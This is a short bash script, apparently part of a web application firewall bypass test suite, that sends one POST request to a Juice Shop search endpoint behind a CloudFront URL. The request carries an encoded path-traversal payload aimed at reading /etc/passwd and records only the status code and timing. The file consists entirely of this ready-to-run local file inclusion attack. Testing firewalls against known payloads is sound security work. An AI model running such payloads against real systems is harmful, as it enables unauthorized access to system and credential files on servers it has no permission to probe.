#!/bin/bash
# WAF Bypass Test — LFI (1 payloads)
# Run: bash curl_lfi.sh

ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"

echo "[lfi] juiceshop-0324: ....%5C....%5C....%5Cetc%5Cpasswd"
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0324" \
  -H "X-Test-Category: lfi" \
  -d '{"content": "....%5C....%5C....%5Cetc%5Cpasswd"}'
echo ""
